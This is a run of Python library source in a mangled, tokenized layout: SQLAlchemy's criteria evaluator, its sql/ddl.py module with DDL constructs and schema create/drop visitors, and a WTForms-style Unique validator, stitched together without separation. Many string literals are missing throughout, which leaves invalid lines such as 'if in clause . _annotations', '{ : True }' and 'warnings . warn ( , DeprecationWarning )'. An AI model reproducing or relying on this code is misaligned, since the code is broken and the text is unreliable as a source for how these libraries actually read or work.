~~~ return lambda obj : False \n 
\n 
~~ def visit_true ( self , clause ) : \n 
~~~ return lambda obj : True \n 
\n 
~~ def visit_column ( self , clause ) : \n 
~~~ if in clause . _annotations : \n 
~~~ parentmapper = clause . _annotations [ ] \n 
if self . target_cls and not issubclass ( \n 
self . target_cls , parentmapper . class_ ) : \n 
~~~ util . warn ( \n 
"Can\'t do in-Python evaluation of criteria against " \n 
"alternate class %s; " \n 
"expiration of objects will not be accurate " \n 
"and/or may fail.  synchronize_session should be set to " \n 
"False or \'fetch\'. " \n 
"This warning will be an exception " \n 
"in 1.0." % parentmapper . class_ \n 
) \n 
~~ key = parentmapper . _columntoproperty [ clause ] . key \n 
~~ else : \n 
~~~ key = clause . key \n 
\n 
~~ get_corresponding_attr = operator . attrgetter ( key ) \n 
return lambda obj : get_corresponding_attr ( obj ) \n 
\n 
~~ def visit_clauselist ( self , clause ) : \n 
~~~ evaluators = list ( map ( self . process , clause . clauses ) ) \n 
if clause . operator is operators . or_ : \n 
~~~ def evaluate ( obj ) : \n 
~~~ has_null = False \n 
for sub_evaluate in evaluators : \n 
~~~ value = sub_evaluate ( obj ) \n 
if value : \n 
~~~ return True \n 
~~ has_null = has_null or value is None \n 
~~ if has_null : \n 
~~~ return None \n 
~~ return False \n 
~~ ~~ elif clause . operator is operators . and_ : \n 
~~~ def evaluate ( obj ) : \n 
~~~ for sub_evaluate in evaluators : \n 
~~~ value = sub_evaluate ( obj ) \n 
if not value : \n 
~~~ if value is None : \n 
~~~ return None \n 
~~ return False \n 
~~ ~~ return True \n 
~~ ~~ else : \n 
~~~ raise UnevaluatableError ( \n 
"Cannot evaluate clauselist with operator %s" % \n 
clause . operator ) \n 
\n 
~~ return evaluate \n 
\n 
~~ def visit_binary ( self , clause ) : \n 
~~~ eval_left , eval_right = list ( map ( self . process , \n 
[ clause . left , clause . right ] ) ) \n 
operator = clause . operator \n 
if operator is operators . is_ : \n 
~~~ def evaluate ( obj ) : \n 
~~~ return eval_left ( obj ) == eval_right ( obj ) \n 
~~ ~~ elif operator is operators . isnot : \n 
~~~ def evaluate ( obj ) : \n 
~~~ return eval_left ( obj ) != eval_right ( obj ) \n 
~~ ~~ elif operator in _straight_ops : \n 
~~~ def evaluate ( obj ) : \n 
~~~ left_val = eval_left ( obj ) \n 
right_val = eval_right ( obj ) \n 
if left_val is None or right_val is None : \n 
~~~ return None \n 
~~ return operator ( eval_left ( obj ) , eval_right ( obj ) ) \n 
~~ ~~ else : \n 
~~~ raise UnevaluatableError ( \n 
"Cannot evaluate %s with operator %s" % \n 
( type ( clause ) . __name__ , clause . operator ) ) \n 
~~ return evaluate \n 
\n 
~~ def visit_unary ( self , clause ) : \n 
~~~ eval_inner = self . process ( clause . element ) \n 
if clause . operator is operators . inv : \n 
~~~ def evaluate ( obj ) : \n 
~~~ value = eval_inner ( obj ) \n 
if value is None : \n 
~~~ return None \n 
~~ return not value \n 
~~ return evaluate \n 
~~ raise UnevaluatableError ( \n 
"Cannot evaluate %s with operator %s" % \n 
( type ( clause ) . __name__ , clause . operator ) ) \n 
\n 
~~ def visit_bindparam ( self , clause ) : \n 
~~~ val = clause . value \n 
return lambda obj : val \n 
# sql/ddl.py \n 
# Copyright (C) 2009-2015 the SQLAlchemy authors and contributors \n 
# <see AUTHORS file> \n 
# \n 
# This module is part of SQLAlchemy and is released under \n 
# the MIT License: http://www.opensource.org/licenses/mit-license.php \n 
~~ ~~ """\nProvides the hierarchy of DDL-defining schema items as well as routines\nto invoke them for a create/drop call.\n\n""" \n 
\n 
from . . import util \n 
from . elements import ClauseElement \n 
from . visitors import traverse \n 
from . base import Executable , _generative , SchemaVisitor , _bind_or_error \n 
from . . util import topological \n 
from . . import event \n 
from . . import exc \n 
\n 
\n 
class _DDLCompiles ( ClauseElement ) : \n 
~~~ def _compiler ( self , dialect , ** kw ) : \n 
~~~ """Return a compiler appropriate for this ClauseElement, given a\n        Dialect.""" \n 
\n 
return dialect . ddl_compiler ( dialect , self , ** kw ) \n 
\n 
\n 
~~ ~~ class DDLElement ( Executable , _DDLCompiles ) : \n 
~~~ """Base class for DDL expression constructs.\n\n    This class is the base for the general purpose :class:`.DDL` class,\n    as well as the various create/drop clause constructs such as\n    :class:`.CreateTable`, :class:`.DropTable`, :class:`.AddConstraint`,\n    etc.\n\n    :class:`.DDLElement` integrates closely with SQLAlchemy events,\n    introduced in :ref:`event_toplevel`.  An instance of one is\n    itself an event receiving callable::\n\n        event.listen(\n            users,\n            \'after_create\',\n            AddConstraint(constraint).execute_if(dialect=\'postgresql\')\n        )\n\n    .. seealso::\n\n        :class:`.DDL`\n\n        :class:`.DDLEvents`\n\n        :ref:`event_toplevel`\n\n        :ref:`schema_ddl_sequences`\n\n    """ \n 
\n 
_execution_options = Executable . _execution_options . union ( { : True } ) \n 
\n 
target = None \n 
on = None \n 
dialect = None \n 
callable_ = None \n 
\n 
def _execute_on_connection ( self , connection , multiparams , params ) : \n 
~~~ return connection . _execute_ddl ( self , multiparams , params ) \n 
\n 
~~ def execute ( self , bind = None , target = None ) : \n 
~~~ """Execute this DDL immediately.\n\n        Executes the DDL statement in isolation using the supplied\n        :class:`.Connectable` or\n        :class:`.Connectable` assigned to the ``.bind``\n        property, if not supplied. If the DDL has a conditional ``on``\n        criteria, it will be invoked with None as the event.\n\n        :param bind:\n          Optional, an ``Engine`` or ``Connection``. If not supplied, a valid\n          :class:`.Connectable` must be present in the\n          ``.bind`` property.\n\n        :param target:\n          Optional, defaults to None.  The target SchemaItem for the\n          execute call.  Will be passed to the ``on`` callable if any,\n          and may also provide string expansion data for the\n          statement. See ``execute_at`` for more information.\n\n        """ \n 
\n 
if bind is None : \n 
~~~ bind = _bind_or_error ( self ) \n 
\n 
~~ if self . _should_execute ( target , bind ) : \n 
~~~ return bind . execute ( self . against ( target ) ) \n 
~~ else : \n 
~~~ bind . engine . logger . info ( \n 
"DDL execution skipped, criteria not met." ) \n 
\n 
~~ ~~ @ util . deprecated ( "0.7" , "See :class:`.DDLEvents`, as well as " \n 
":meth:`.DDLElement.execute_if`." ) \n 
def execute_at ( self , event_name , target ) : \n 
~~~ """Link execution of this DDL to the DDL lifecycle of a SchemaItem.\n\n        Links this ``DDLElement`` to a ``Table`` or ``MetaData`` instance,\n        executing it when that schema item is created or dropped. The DDL\n        statement will be executed using the same Connection and transactional\n        context as the Table create/drop itself. The ``.bind`` property of\n        this statement is ignored.\n\n        :param event:\n          One of the events defined in the schema item\'s ``.ddl_events``;\n          e.g. \'before-create\', \'after-create\', \'before-drop\' or \'after-drop\'\n\n        :param target:\n          The Table or MetaData instance for which this DDLElement will\n          be associated with.\n\n        A DDLElement instance can be linked to any number of schema items.\n\n        ``execute_at`` builds on the ``append_ddl_listener`` interface of\n        :class:`.MetaData` and :class:`.Table` objects.\n\n        Caveat: Creating or dropping a Table in isolation will also trigger\n        any DDL set to ``execute_at`` that Table\'s MetaData.  This may change\n        in a future release.\n\n        """ \n 
\n 
def call_event ( target , connection , ** kw ) : \n 
~~~ if self . _should_execute_deprecated ( event_name , \n 
target , connection , ** kw ) : \n 
~~~ return connection . execute ( self . against ( target ) ) \n 
\n 
~~ ~~ event . listen ( target , "" + event_name . replace ( , ) , call_event ) \n 
\n 
~~ @ _generative \n 
def against ( self , target ) : \n 
~~~ """Return a copy of this DDL against a specific schema item.""" \n 
\n 
self . target = target \n 
\n 
~~ @ _generative \n 
def execute_if ( self , dialect = None , callable_ = None , state = None ) : \n 
~~~ """Return a callable that will execute this\n        DDLElement conditionally.\n\n        Used to provide a wrapper for event listening::\n\n            event.listen(\n                        metadata,\n                        \'before_create\',\n                        DDL("my_ddl").execute_if(dialect=\'postgresql\')\n                    )\n\n        :param dialect: May be a string, tuple or a callable\n          predicate.  If a string, it will be compared to the name of the\n          executing database dialect::\n\n            DDL(\'something\').execute_if(dialect=\'postgresql\')\n\n          If a tuple, specifies multiple dialect names::\n\n            DDL(\'something\').execute_if(dialect=(\'postgresql\', \'mysql\'))\n\n        :param callable_: A callable, which will be invoked with\n          four positional arguments as well as optional keyword\n          arguments:\n\n            :ddl:\n              This DDL element.\n\n            :target:\n              The :class:`.Table` or :class:`.MetaData` object which is the\n              target of this event. May be None if the DDL is executed\n              explicitly.\n\n            :bind:\n              The :class:`.Connection` being used for DDL execution\n\n            :tables:\n              Optional keyword argument - a list of Table objects which are to\n              be created/ dropped within a MetaData.create_all() or drop_all()\n              method call.\n\n            :state:\n              Optional keyword argument - will be the ``state`` argument\n              passed to this function.\n\n            :checkfirst:\n             Keyword argument, will be True if the \'checkfirst\' flag was\n             set during the call to ``create()``, ``create_all()``,\n             ``drop()``, ``drop_all()``.\n\n          If the callable returns a true value, the DDL statement will be\n          executed.\n\n        :param state: any value which will be passed to the callable\\_\n          as the ``state`` keyword argument.\n\n        .. seealso::\n\n            :class:`.DDLEvents`\n\n            :ref:`event_toplevel`\n\n        """ \n 
self . dialect = dialect \n 
self . callable_ = callable_ \n 
self . state = state \n 
\n 
~~ def _should_execute ( self , target , bind , ** kw ) : \n 
~~~ if self . on is not None and not self . _should_execute_deprecated ( None , target , bind , ** kw ) : \n 
~~~ return False \n 
\n 
~~ if isinstance ( self . dialect , util . string_types ) : \n 
~~~ if self . dialect != bind . engine . name : \n 
~~~ return False \n 
~~ ~~ elif isinstance ( self . dialect , ( tuple , list , set ) ) : \n 
~~~ if bind . engine . name not in self . dialect : \n 
~~~ return False \n 
~~ ~~ if ( self . callable_ is not None and \n 
not self . callable_ ( self , target , bind , \n 
state = self . state , ** kw ) ) : \n 
~~~ return False \n 
\n 
~~ return True \n 
\n 
~~ def _should_execute_deprecated ( self , event , target , bind , ** kw ) : \n 
~~~ if self . on is None : \n 
~~~ return True \n 
~~ elif isinstance ( self . on , util . string_types ) : \n 
~~~ return self . on == bind . engine . name \n 
~~ elif isinstance ( self . on , ( tuple , list , set ) ) : \n 
~~~ return bind . engine . name in self . on \n 
~~ else : \n 
~~~ return self . on ( self , event , target , bind , ** kw ) \n 
\n 
~~ ~~ def __call__ ( self , target , bind , ** kw ) : \n 
~~~ """Execute the DDL as a ddl_listener.""" \n 
\n 
if self . _should_execute ( target , bind , ** kw ) : \n 
~~~ return bind . execute ( self . against ( target ) ) \n 
\n 
~~ ~~ def _check_ddl_on ( self , on ) : \n 
~~~ if ( on is not None and \n 
( not isinstance ( on , util . string_types + ( tuple , list , set ) ) and \n 
not util . callable ( on ) ) ) : \n 
~~~ raise exc . ArgumentError ( \n 
"Expected the name of a database dialect, a tuple " \n 
"of names, or a callable for " \n 
"\'on\' criteria, got type \'%s\'." % type ( on ) . __name__ ) \n 
\n 
~~ ~~ def bind ( self ) : \n 
~~~ if self . _bind : \n 
~~~ return self . _bind \n 
\n 
~~ ~~ def _set_bind ( self , bind ) : \n 
~~~ self . _bind = bind \n 
~~ bind = property ( bind , _set_bind ) \n 
\n 
def _generate ( self ) : \n 
~~~ s = self . __class__ . __new__ ( self . __class__ ) \n 
s . __dict__ = self . __dict__ . copy ( ) \n 
return s \n 
\n 
\n 
~~ ~~ class DDL ( DDLElement ) : \n 
~~~ """A literal DDL statement.\n\n    Specifies literal SQL DDL to be executed by the database.  DDL objects\n    function as DDL event listeners, and can be subscribed to those events\n    listed in :class:`.DDLEvents`, using either :class:`.Table` or\n    :class:`.MetaData` objects as targets.   Basic templating support allows\n    a single DDL instance to handle repetitive tasks for multiple tables.\n\n    Examples::\n\n      from sqlalchemy import event, DDL\n\n      tbl = Table(\'users\', metadata, Column(\'uid\', Integer))\n      event.listen(tbl, \'before_create\', DDL(\'DROP TRIGGER users_trigger\'))\n\n      spow = DDL(\'ALTER TABLE %(table)s SET secretpowers TRUE\')\n      event.listen(tbl, \'after_create\', spow.execute_if(dialect=\'somedb\'))\n\n      drop_spow = DDL(\'ALTER TABLE users SET secretpowers FALSE\')\n      connection.execute(drop_spow)\n\n    When operating on Table events, the following ``statement``\n    string substitions are available::\n\n      %(table)s  - the Table name, with any required quoting applied\n      %(schema)s - the schema name, with any required quoting applied\n      %(fullname)s - the Table name including schema, quoted if needed\n\n    The DDL\'s "context", if any, will be combined with the standard\n    substitutions noted above.  Keys present in the context will override\n    the standard substitutions.\n\n    """ \n 
\n 
__visit_name__ = "ddl" \n 
\n 
def __init__ ( self , statement , on = None , context = None , bind = None ) : \n 
~~~ """Create a DDL statement.\n\n        :param statement:\n          A string or unicode string to be executed.  Statements will be\n          processed with Python\'s string formatting operator.  See the\n          ``context`` argument and the ``execute_at`` method.\n\n          A literal \'%\' in a statement must be escaped as \'%%\'.\n\n          SQL bind parameters are not available in DDL statements.\n\n        :param on:\n          .. deprecated:: 0.7\n            See :meth:`.DDLElement.execute_if`.\n\n          Optional filtering criteria.  May be a string, tuple or a callable\n          predicate.  If a string, it will be compared to the name of the\n          executing database dialect::\n\n            DDL(\'something\', on=\'postgresql\')\n\n          If a tuple, specifies multiple dialect names::\n\n            DDL(\'something\', on=(\'postgresql\', \'mysql\'))\n\n          If a callable, it will be invoked with four positional arguments\n          as well as optional keyword arguments:\n\n            :ddl:\n              This DDL element.\n\n            :event:\n              The name of the event that has triggered this DDL, such as\n              \'after-create\' Will be None if the DDL is executed explicitly.\n\n            :target:\n              The ``Table`` or ``MetaData`` object which is the target of\n              this event. May be None if the DDL is executed explicitly.\n\n            :connection:\n              The ``Connection`` being used for DDL execution\n\n            :tables:\n              Optional keyword argument - a list of Table objects which are to\n              be created/ dropped within a MetaData.create_all() or drop_all()\n              method call.\n\n\n          If the callable returns a true value, the DDL statement will be\n          executed.\n\n        :param context:\n          Optional dictionary, defaults to None.  These values will be\n          available for use in string substitutions on the DDL statement.\n\n        :param bind:\n          Optional. A :class:`.Connectable`, used by\n          default when ``execute()`` is invoked without a bind argument.\n\n\n        .. seealso::\n\n            :class:`.DDLEvents`\n\n            :ref:`event_toplevel`\n\n        """ \n 
\n 
if not isinstance ( statement , util . string_types ) : \n 
~~~ raise exc . ArgumentError ( \n 
"Expected a string or unicode SQL statement, got \'%r\'" % \n 
statement ) \n 
\n 
~~ self . statement = statement \n 
self . context = context or { } \n 
\n 
self . _check_ddl_on ( on ) \n 
self . on = on \n 
self . _bind = bind \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return % ( \n 
type ( self ) . __name__ , id ( self ) , \n 
. join ( [ repr ( self . statement ) ] + \n 
[ % ( key , getattr ( self , key ) ) \n 
for key in ( , ) \n 
if getattr ( self , key ) ] ) ) \n 
\n 
\n 
~~ ~~ class _CreateDropBase ( DDLElement ) : \n 
~~~ """Base class for DDL constructs that represent CREATE and DROP or\n    equivalents.\n\n    The common theme of _CreateDropBase is a single\n    ``element`` attribute which refers to the element\n    to be created or dropped.\n\n    """ \n 
\n 
def __init__ ( self , element , on = None , bind = None ) : \n 
~~~ self . element = element \n 
self . _check_ddl_on ( on ) \n 
self . on = on \n 
self . bind = bind \n 
\n 
~~ def _create_rule_disable ( self , compiler ) : \n 
~~~ """Allow disable of _create_rule using a callable.\n\n        Pass to _create_rule using\n        util.portable_instancemethod(self._create_rule_disable)\n        to retain serializability.\n\n        """ \n 
return False \n 
\n 
\n 
~~ ~~ class CreateSchema ( _CreateDropBase ) : \n 
~~~ """Represent a CREATE SCHEMA statement.\n\n    .. versionadded:: 0.7.4\n\n    The argument here is the string name of the schema.\n\n    """ \n 
\n 
__visit_name__ = "create_schema" \n 
\n 
def __init__ ( self , name , quote = None , ** kw ) : \n 
~~~ """Create a new :class:`.CreateSchema` construct.""" \n 
\n 
self . quote = quote \n 
super ( CreateSchema , self ) . __init__ ( name , ** kw ) \n 
\n 
\n 
~~ ~~ class DropSchema ( _CreateDropBase ) : \n 
~~~ """Represent a DROP SCHEMA statement.\n\n    The argument here is the string name of the schema.\n\n    .. versionadded:: 0.7.4\n\n    """ \n 
\n 
__visit_name__ = "drop_schema" \n 
\n 
def __init__ ( self , name , quote = None , cascade = False , ** kw ) : \n 
~~~ """Create a new :class:`.DropSchema` construct.""" \n 
\n 
self . quote = quote \n 
self . cascade = cascade \n 
super ( DropSchema , self ) . __init__ ( name , ** kw ) \n 
\n 
\n 
~~ ~~ class CreateTable ( _CreateDropBase ) : \n 
~~~ """Represent a CREATE TABLE statement.""" \n 
\n 
__visit_name__ = "create_table" \n 
\n 
def __init__ ( self , element , on = None , bind = None ) : \n 
~~~ """Create a :class:`.CreateTable` construct.\n\n        :param element: a :class:`.Table` that\'s the subject\n         of the CREATE\n        :param on: See the description for \'on\' in :class:`.DDL`.\n        :param bind: See the description for \'bind\' in :class:`.DDL`.\n\n        """ \n 
super ( CreateTable , self ) . __init__ ( element , on = on , bind = bind ) \n 
self . columns = [ CreateColumn ( column ) \n 
for column in element . columns \n 
] \n 
\n 
\n 
~~ ~~ class _DropView ( _CreateDropBase ) : \n 
~~~ """Semi-public \'DROP VIEW\' construct.\n\n    Used by the test suite for dialect-agnostic drops of views.\n    This object will eventually be part of a public "view" API.\n\n    """ \n 
__visit_name__ = "drop_view" \n 
\n 
\n 
~~ class CreateColumn ( _DDLCompiles ) : \n 
~~~ """Represent a :class:`.Column` as rendered in a CREATE TABLE statement,\n    via the :class:`.CreateTable` construct.\n\n    This is provided to support custom column DDL within the generation\n    of CREATE TABLE statements, by using the\n    compiler extension documented in :ref:`sqlalchemy.ext.compiler_toplevel`\n    to extend :class:`.CreateColumn`.\n\n    Typical integration is to examine the incoming :class:`.Column`\n    object, and to redirect compilation if a particular flag or condition\n    is found::\n\n        from sqlalchemy import schema\n        from sqlalchemy.ext.compiler import compiles\n\n        @compiles(schema.CreateColumn)\n        def compile(element, compiler, **kw):\n            column = element.element\n\n            if "special" not in column.info:\n                return compiler.visit_create_column(element, **kw)\n\n            text = "%s SPECIAL DIRECTIVE %s" % (\n                    column.name,\n                    compiler.type_compiler.process(column.type)\n                )\n            default = compiler.get_column_default_string(column)\n            if default is not None:\n                text += " DEFAULT " + default\n\n            if not column.nullable:\n                text += " NOT NULL"\n\n            if column.constraints:\n                text += " ".join(\n                            compiler.process(const)\n                            for const in column.constraints)\n            return text\n\n    The above construct can be applied to a :class:`.Table` as follows::\n\n        from sqlalchemy import Table, Metadata, Column, Integer, String\n        from sqlalchemy import schema\n\n        metadata = MetaData()\n\n        table = Table(\'mytable\', MetaData(),\n                Column(\'x\', Integer, info={"special":True}, primary_key=True),\n                Column(\'y\', String(50)),\n                Column(\'z\', String(20), info={"special":True})\n            )\n\n        metadata.create_all(conn)\n\n    Above, the directives we\'ve added to the :attr:`.Column.info` collection\n    will be detected by our custom compilation scheme::\n\n        CREATE TABLE mytable (\n                x SPECIAL DIRECTIVE INTEGER NOT NULL,\n                y VARCHAR(50),\n                z SPECIAL DIRECTIVE VARCHAR(20),\n            PRIMARY KEY (x)\n        )\n\n    The :class:`.CreateColumn` construct can also be used to skip certain\n    columns when producing a ``CREATE TABLE``.  This is accomplished by\n    creating a compilation rule that conditionally returns ``None``.\n    This is essentially how to produce the same effect as using the\n    ``system=True`` argument on :class:`.Column`, which marks a column\n    as an implicitly-present "system" column.\n\n    For example, suppose we wish to produce a :class:`.Table` which skips\n    rendering of the Postgresql ``xmin`` column against the Postgresql\n    backend, but on other backends does render it, in anticipation of a\n    triggered rule.  A conditional compilation rule could skip this name only\n    on Postgresql::\n\n        from sqlalchemy.schema import CreateColumn\n\n        @compiles(CreateColumn, "postgresql")\n        def skip_xmin(element, compiler, **kw):\n            if element.element.name == \'xmin\':\n                return None\n            else:\n                return compiler.visit_create_column(element, **kw)\n\n\n        my_table = Table(\'mytable\', metadata,\n                    Column(\'id\', Integer, primary_key=True),\n                    Column(\'xmin\', Integer)\n                )\n\n    Above, a :class:`.CreateTable` construct will generate a ``CREATE TABLE``\n    which only includes the ``id`` column in the string; the ``xmin`` column\n    will be omitted, but only against the Postgresql backend.\n\n    .. versionadded:: 0.8.3 The :class:`.CreateColumn` construct supports\n       skipping of columns by returning ``None`` from a custom compilation\n       rule.\n\n    .. versionadded:: 0.8 The :class:`.CreateColumn` construct was added\n       to support custom column creation styles.\n\n    """ \n 
__visit_name__ = \n 
\n 
def __init__ ( self , element ) : \n 
~~~ self . element = element \n 
\n 
\n 
~~ ~~ class DropTable ( _CreateDropBase ) : \n 
~~~ """Represent a DROP TABLE statement.""" \n 
\n 
__visit_name__ = "drop_table" \n 
\n 
\n 
~~ class CreateSequence ( _CreateDropBase ) : \n 
~~~ """Represent a CREATE SEQUENCE statement.""" \n 
\n 
__visit_name__ = "create_sequence" \n 
\n 
\n 
~~ class DropSequence ( _CreateDropBase ) : \n 
~~~ """Represent a DROP SEQUENCE statement.""" \n 
\n 
__visit_name__ = "drop_sequence" \n 
\n 
\n 
~~ class CreateIndex ( _CreateDropBase ) : \n 
~~~ """Represent a CREATE INDEX statement.""" \n 
\n 
__visit_name__ = "create_index" \n 
\n 
\n 
~~ class DropIndex ( _CreateDropBase ) : \n 
~~~ """Represent a DROP INDEX statement.""" \n 
\n 
__visit_name__ = "drop_index" \n 
\n 
\n 
~~ class AddConstraint ( _CreateDropBase ) : \n 
~~~ """Represent an ALTER TABLE ADD CONSTRAINT statement.""" \n 
\n 
__visit_name__ = "add_constraint" \n 
\n 
def __init__ ( self , element , * args , ** kw ) : \n 
~~~ super ( AddConstraint , self ) . __init__ ( element , * args , ** kw ) \n 
element . _create_rule = util . portable_instancemethod ( \n 
self . _create_rule_disable ) \n 
\n 
\n 
~~ ~~ class DropConstraint ( _CreateDropBase ) : \n 
~~~ """Represent an ALTER TABLE DROP CONSTRAINT statement.""" \n 
\n 
__visit_name__ = "drop_constraint" \n 
\n 
def __init__ ( self , element , cascade = False , ** kw ) : \n 
~~~ self . cascade = cascade \n 
super ( DropConstraint , self ) . __init__ ( element , ** kw ) \n 
element . _create_rule = util . portable_instancemethod ( \n 
self . _create_rule_disable ) \n 
\n 
\n 
~~ ~~ class DDLBase ( SchemaVisitor ) : \n 
~~~ def __init__ ( self , connection ) : \n 
~~~ self . connection = connection \n 
\n 
\n 
~~ ~~ class SchemaGenerator ( DDLBase ) : \n 
\n 
~~~ def __init__ ( self , dialect , connection , checkfirst = False , \n 
tables = None , ** kwargs ) : \n 
~~~ super ( SchemaGenerator , self ) . __init__ ( connection , ** kwargs ) \n 
self . checkfirst = checkfirst \n 
self . tables = tables \n 
self . preparer = dialect . identifier_preparer \n 
self . dialect = dialect \n 
self . memo = { } \n 
\n 
~~ def _can_create_table ( self , table ) : \n 
~~~ self . dialect . validate_identifier ( table . name ) \n 
if table . schema : \n 
~~~ self . dialect . validate_identifier ( table . schema ) \n 
~~ return not self . checkfirst or not self . dialect . has_table ( self . connection , \n 
table . name , schema = table . schema ) \n 
\n 
~~ def _can_create_sequence ( self , sequence ) : \n 
~~~ return self . dialect . supports_sequences and ( \n 
( not self . dialect . sequences_optional or \n 
not sequence . optional ) and \n 
( \n 
not self . checkfirst or \n 
not self . dialect . has_sequence ( \n 
self . connection , \n 
sequence . name , \n 
schema = sequence . schema ) \n 
) \n 
) \n 
\n 
~~ def visit_metadata ( self , metadata ) : \n 
~~~ if self . tables is not None : \n 
~~~ tables = self . tables \n 
~~ else : \n 
~~~ tables = list ( metadata . tables . values ( ) ) \n 
~~ collection = [ t for t in sort_tables ( tables ) \n 
if self . _can_create_table ( t ) ] \n 
seq_coll = [ s for s in metadata . _sequences . values ( ) \n 
if s . column is None and self . _can_create_sequence ( s ) ] \n 
\n 
metadata . dispatch . before_create ( metadata , self . connection , \n 
tables = collection , \n 
checkfirst = self . checkfirst , \n 
_ddl_runner = self ) \n 
\n 
for seq in seq_coll : \n 
~~~ self . traverse_single ( seq , create_ok = True ) \n 
\n 
~~ for table in collection : \n 
~~~ self . traverse_single ( table , create_ok = True ) \n 
\n 
~~ metadata . dispatch . after_create ( metadata , self . connection , \n 
tables = collection , \n 
checkfirst = self . checkfirst , \n 
_ddl_runner = self ) \n 
\n 
~~ def visit_table ( self , table , create_ok = False ) : \n 
~~~ if not create_ok and not self . _can_create_table ( table ) : \n 
~~~ return \n 
\n 
~~ table . dispatch . before_create ( table , self . connection , \n 
checkfirst = self . checkfirst , \n 
_ddl_runner = self ) \n 
\n 
for column in table . columns : \n 
~~~ if column . default is not None : \n 
~~~ self . traverse_single ( column . default ) \n 
\n 
~~ ~~ self . connection . execute ( CreateTable ( table ) ) \n 
\n 
if hasattr ( table , ) : \n 
~~~ for index in table . indexes : \n 
~~~ self . traverse_single ( index ) \n 
\n 
~~ ~~ table . dispatch . after_create ( table , self . connection , \n 
checkfirst = self . checkfirst , \n 
_ddl_runner = self ) \n 
\n 
~~ def visit_sequence ( self , sequence , create_ok = False ) : \n 
~~~ if not create_ok and not self . _can_create_sequence ( sequence ) : \n 
~~~ return \n 
~~ self . connection . execute ( CreateSequence ( sequence ) ) \n 
\n 
~~ def visit_index ( self , index ) : \n 
~~~ self . connection . execute ( CreateIndex ( index ) ) \n 
\n 
\n 
~~ ~~ class SchemaDropper ( DDLBase ) : \n 
\n 
~~~ def __init__ ( self , dialect , connection , checkfirst = False , \n 
tables = None , ** kwargs ) : \n 
~~~ super ( SchemaDropper , self ) . __init__ ( connection , ** kwargs ) \n 
self . checkfirst = checkfirst \n 
self . tables = tables \n 
self . preparer = dialect . identifier_preparer \n 
self . dialect = dialect \n 
self . memo = { } \n 
\n 
~~ def visit_metadata ( self , metadata ) : \n 
~~~ if self . tables is not None : \n 
~~~ tables = self . tables \n 
~~ else : \n 
~~~ tables = list ( metadata . tables . values ( ) ) \n 
\n 
~~ collection = [ \n 
t \n 
for t in reversed ( sort_tables ( tables ) ) \n 
if self . _can_drop_table ( t ) \n 
] \n 
\n 
seq_coll = [ \n 
s \n 
for s in metadata . _sequences . values ( ) \n 
if s . column is None and self . _can_drop_sequence ( s ) \n 
] \n 
\n 
metadata . dispatch . before_drop ( \n 
metadata , self . connection , tables = collection , \n 
checkfirst = self . checkfirst , _ddl_runner = self ) \n 
\n 
for table in collection : \n 
~~~ self . traverse_single ( table , drop_ok = True ) \n 
\n 
~~ for seq in seq_coll : \n 
~~~ self . traverse_single ( seq , drop_ok = True ) \n 
\n 
~~ metadata . dispatch . after_drop ( \n 
metadata , self . connection , tables = collection , \n 
checkfirst = self . checkfirst , _ddl_runner = self ) \n 
\n 
~~ def _can_drop_table ( self , table ) : \n 
~~~ self . dialect . validate_identifier ( table . name ) \n 
if table . schema : \n 
~~~ self . dialect . validate_identifier ( table . schema ) \n 
~~ return not self . checkfirst or self . dialect . has_table ( \n 
self . connection , table . name , schema = table . schema ) \n 
\n 
~~ def _can_drop_sequence ( self , sequence ) : \n 
~~~ return self . dialect . supports_sequences and ( ( not self . dialect . sequences_optional or \n 
not sequence . optional ) and \n 
( not self . checkfirst or \n 
self . dialect . has_sequence ( \n 
self . connection , \n 
sequence . name , \n 
schema = sequence . schema ) ) \n 
) \n 
\n 
~~ def visit_index ( self , index ) : \n 
~~~ self . connection . execute ( DropIndex ( index ) ) \n 
\n 
~~ def visit_table ( self , table , drop_ok = False ) : \n 
~~~ if not drop_ok and not self . _can_drop_table ( table ) : \n 
~~~ return \n 
\n 
~~ table . dispatch . before_drop ( table , self . connection , \n 
checkfirst = self . checkfirst , \n 
_ddl_runner = self ) \n 
\n 
for column in table . columns : \n 
~~~ if column . default is not None : \n 
~~~ self . traverse_single ( column . default ) \n 
\n 
~~ ~~ self . connection . execute ( DropTable ( table ) ) \n 
\n 
table . dispatch . after_drop ( table , self . connection , \n 
checkfirst = self . checkfirst , \n 
_ddl_runner = self ) \n 
\n 
~~ def visit_sequence ( self , sequence , drop_ok = False ) : \n 
~~~ if not drop_ok and not self . _can_drop_sequence ( sequence ) : \n 
~~~ return \n 
~~ self . connection . execute ( DropSequence ( sequence ) ) \n 
\n 
\n 
~~ ~~ def sort_tables ( tables , skip_fn = None , extra_dependencies = None ) : \n 
~~~ """sort a collection of Table objects in order of\n                their foreign-key dependency.""" \n 
\n 
tables = list ( tables ) \n 
tuples = [ ] \n 
if extra_dependencies is not None : \n 
~~~ tuples . extend ( extra_dependencies ) \n 
\n 
~~ def visit_foreign_key ( fkey ) : \n 
~~~ if fkey . use_alter : \n 
~~~ return \n 
~~ elif skip_fn and skip_fn ( fkey ) : \n 
~~~ return \n 
~~ parent_table = fkey . column . table \n 
if parent_table in tables : \n 
~~~ child_table = fkey . parent . table \n 
if parent_table is not child_table : \n 
~~~ tuples . append ( ( parent_table , child_table ) ) \n 
\n 
~~ ~~ ~~ for table in tables : \n 
~~~ traverse ( table , \n 
{ : True } , \n 
{ : visit_foreign_key } ) \n 
\n 
tuples . extend ( \n 
[ parent , table ] for parent in table . _extra_dependencies \n 
) \n 
\n 
~~ return list ( topological . sort ( tuples , tables ) ) \n 
~~ from __future__ import unicode_literals \n 
import warnings \n 
from wtforms import ValidationError \n 
from sqlalchemy . orm . exc import NoResultFound \n 
\n 
\n 
class Unique ( object ) : \n 
~~~ """Checks field value unicity against specified table field.\n\n    :param get_session:\n        A function that return a SQAlchemy Session.\n    :param model:\n        The model to check unicity against.\n    :param column:\n        The unique column.\n    :param message:\n        The error message.\n    """ \n 
field_flags = ( , ) \n 
\n 
def __init__ ( self , get_session , model , column , message = None ) : \n 
~~~ warnings . warn ( , DeprecationWarning ) \n 
self . get_session = get_session \n 
self . model = model \n 
self . column = column \n 
self . message = message \n 
\n 
~~ def __call__ ( self , form , field ) : \n 
~~~ try : \n 
~~~ obj = self . get_session ( ) . query ( self . model ) . filter ( self . column == field . data ) . one ( ) \n 
if not hasattr ( form , ) or not form . _obj == obj : \n 
~~~ if self . message is None : \n 
~~~ self . message = field . gettext ( ) \n 
~~ raise ValidationError ( self . message ) \n 
~~ ~~ except NoResultFound : \n 
~~~ pass \n 
# ext/pygmentplugin.py \n 
